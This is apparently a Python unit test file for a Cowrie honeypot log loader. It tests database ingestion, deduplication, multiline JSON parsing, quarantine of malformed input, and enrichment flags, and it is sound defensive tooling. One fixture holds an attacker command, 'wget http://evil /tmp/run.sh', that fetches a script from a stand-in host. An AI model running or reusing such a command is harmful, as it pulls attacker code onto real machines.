"""Unit tests for the bulk loader."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict

from sqlalchemy import select, text
from sqlalchemy.orm import sessionmaker

from cowrieprocessor.db import RawEvent, SessionSummary, apply_migrations, create_engine_from_settings
from cowrieprocessor.loader import BulkLoader, BulkLoaderConfig, LoaderCheckpoint
from cowrieprocessor.settings import DatabaseSettings


def _write_events(path: Path, events: list[dict]):
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event))
            fh.write("\n")


def _make_engine(tmp_path: Path):
    db_path = tmp_path / "loader.sqlite"
    settings = DatabaseSettings(url=f"sqlite:///{db_path}")
    engine = create_engine_from_settings(settings)
    apply_migrations(engine)
    return engine


def test_bulk_loader_inserts_raw_events(tmp_path) -> None:
    """Loader should persist events, sanitize commands, and populate summaries."""
    events = [
        {
            "session": "abc123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
            "sensor": "sensor-a",
        },
        {
            "session": "abc123",
            "eventid": "cowrie.command.input",
            "timestamp": "2024-01-01T00:01:00Z",
            "input": "wget http://evil /tmp/run.sh",
            "sensor": "sensor-a",
        },
    ]
    source = tmp_path / "events.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1))
    checkpoints: list[LoaderCheckpoint] = []
    metrics = loader.load_paths([source], checkpoint_cb=checkpoints.append)

    assert metrics.events_inserted == 2
    assert metrics.events_quarantined == 1
    assert checkpoints
    assert checkpoints[-1].sessions == ["abc123"]
    assert checkpoints[-1].events_quarantined == 1

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        sanitized = next(row.payload for row in payloads if row.payload.get("input_safe"))
        assert sanitized["input_safe"], "expected sanitized command"
        # With intelligent defanging, the input field contains the defanged version
        assert sanitized.get("input") is not None
        assert "[defang:" in sanitized.get("input", "")
        # Original command should be preserved
        assert sanitized.get("input_original") == "wget http://evil /tmp/run.sh"

        summaries = list(conn.execute(select(SessionSummary)).all())
        assert len(summaries) == 1
        summary = summaries[0]
        assert summary.event_count == 2
        assert summary.command_count == 1
        assert summary.source_files
        assert summary.vt_flagged == 0
        assert summary.dshield_flagged == 0
        assert summary.matcher == "sensor-a"


def test_bulk_loader_is_idempotent(tmp_path) -> None:
    """Loader should tolerate re-ingesting the same file without duplicating rows."""
    events = [
        {
            "session": "def456",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-02-01T12:00:00Z",
        }
    ]
    source = tmp_path / "reuse.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=5))

    first = loader.load_paths([source])
    second = loader.load_paths([source])

    assert first.events_inserted == 1
    assert second.events_inserted == 0
    assert second.duplicates_skipped >= 1


def _write_multiline_events(path: Path, events: list[dict]):
    """Write events as pretty-printed JSON objects."""
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event, indent=2))
            fh.write("\n")


def test_bulk_loader_handles_multiline_json(tmp_path) -> None:
    """Loader should parse pretty-printed JSON when multiline_json is enabled."""
    events = [
        {
            "session": "multiline123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
        },
        {
            "session": "multiline123",
            "eventid": "cowrie.command.input",
            "timestamp": "2024-01-01T00:01:00Z",
            "input": "ls -la",
        },
    ]
    source = tmp_path / "multiline_events.json"
    _write_multiline_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    assert metrics.events_inserted == 2
    assert metrics.events_read == 2

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        # Verify the events were parsed correctly
        sessions = {payload[0]["session"] for payload in payloads}
        assert sessions == {"multiline123"}


def test_bulk_loader_rejects_multiline_json_by_default(tmp_path) -> None:
    """Loader should reject pretty-printed JSON when multiline_json is disabled."""
    events = [
        {
            "session": "multiline123",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-01-01T00:00:00Z",
            "src_ip": "1.2.3.4",
        }
    ]
    source = tmp_path / "multiline_events.json"
    _write_multiline_events(source, events)

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=False))
    metrics = loader.load_paths([source])

    # Should have malformed events due to multiline JSON (6 lines total)
    assert metrics.events_read == 6  # Each line is treated as a separate event
    assert metrics.events_inserted == 6  # All events are inserted as quarantined
    assert metrics.events_quarantined == 6  # All are quarantined due to validation errors


def test_bulk_loader_mixed_json_formats(tmp_path) -> None:
    """Loader should handle mixed single-line and multiline JSON formats."""
    # Create a file with both formats
    source = tmp_path / "mixed_events.json"
    with source.open("w", encoding="utf-8") as fh:
        # Single-line JSON
        fh.write(
            json.dumps(
                {
                    "session": "single123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2024-01-01T00:00:00Z",
                }
            )
        )
        fh.write("\n")

        # Multiline JSON
        fh.write(
            json.dumps(
                {
                    "session": "multi123",
                    "eventid": "cowrie.session.connect",
                    "timestamp": "2024-01-01T00:01:00Z",
                },
                indent=2,
            )
        )
        fh.write("\n")

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    assert metrics.events_inserted == 2
    assert metrics.events_read == 2


class DummyEnrichment:
    """Simple in-memory enrichment stub returning flagged metadata."""

    def __init__(self) -> None:
        """Initialise call tracking containers for the dummy service."""
        self.session_calls: list[tuple[str, str]] = []
        self.file_calls: list[str] = []

    def enrich_session(self, session_id: str, src_ip: str) -> Dict[str, Any]:
        """Return canned session enrichment payload and record invocation."""
        self.session_calls.append((session_id, src_ip))
        return {
            "session_id": session_id,
            "src_ip": src_ip,
            "enrichment": {
                "dshield": {"ip": {"count": "5", "attacks": "10"}},
                "urlhaus": "malware,botnet",
                "spur": ["", "", "", "DATACENTER"],
            },
        }

    def enrich_file(self, file_hash: str, filename: str) -> Dict[str, Any]:
        """Return canned VirusTotal enrichment payload and record invocation."""
        self.file_calls.append(file_hash)
        return {
            "file_hash": file_hash,
            "filename": filename,
            "enrichment": {
                "virustotal": {
                    "data": {
                        "attributes": {
                            "last_analysis_stats": {"malicious": 3},
                        }
                    }
                }
            },
        }


def test_bulk_loader_sets_enrichment_flags(tmp_path) -> None:
    """Loader should populate summary flags when enrichment service is provided."""
    events = [
        {
            "session": "enrich1",
            "eventid": "cowrie.session.connect",
            "timestamp": "2024-03-01T00:00:00Z",
            "src_ip": "203.0.113.10",
            "sensor": "sensor-enrich",
        },
        {
            "session": "enrich1",
            "eventid": "cowrie.session.file_download",
            "timestamp": "2024-03-01T00:01:00Z",
            "shasum": "deadbeef",
            "src_ip": "203.0.113.10",
            "sensor": "sensor-enrich",
        },
    ]
    source = tmp_path / "enrich.json"
    _write_events(source, events)

    engine = _make_engine(tmp_path)
    service = DummyEnrichment()
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=10), enrichment_service=service)
    loader.load_paths([source])

    assert service.session_calls == [("enrich1", "203.0.113.10")]
    assert service.file_calls == ["deadbeef"]

    Session = sessionmaker(bind=engine, future=True)
    with Session() as db_session:
        summary = db_session.query(SessionSummary).filter(SessionSummary.session_id == "enrich1").one()
        assert summary.vt_flagged == 1
        assert summary.dshield_flagged == 1
        assert summary.command_count == 0
        assert summary.matcher == "sensor-enrich"

    with engine.connect() as conn:
        payloads = list(conn.execute(select(RawEvent.payload)).all())
        assert len(payloads) == 2
        sessions = {payload[0]["session"] for payload in payloads}
        assert sessions == {"enrich1"}


def test_bulk_loader_multiline_json_malformed_limit(tmp_path) -> None:
    """Loader should handle malformed multiline JSON gracefully."""
    source = tmp_path / "malformed_multiline.json"
    with source.open("w", encoding="utf-8") as fh:
        # Write many lines that don't form valid JSON
        for i in range(150):  # Exceeds the 100-line limit
            fh.write(f"malformed line {i}\n")

    engine = _make_engine(tmp_path)
    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=1, multiline_json=True))
    metrics = loader.load_paths([source])

    # Should handle malformed content gracefully
    # The parser accumulates lines until it hits the limit, then creates malformed events
    assert metrics.events_read == 2  # Two malformed events (one at limit, one remaining)
    assert metrics.events_inserted == 2  # Malformed events are inserted as quarantined
    assert metrics.events_quarantined == 2  # All are quarantined due to validation errors

    with engine.connect() as conn:
        # Malformed events should be in dead_letter_events table
        dl_count = conn.execute(text('SELECT COUNT(*) FROM dead_letter_events')).scalar_one()
        assert dl_count == 2
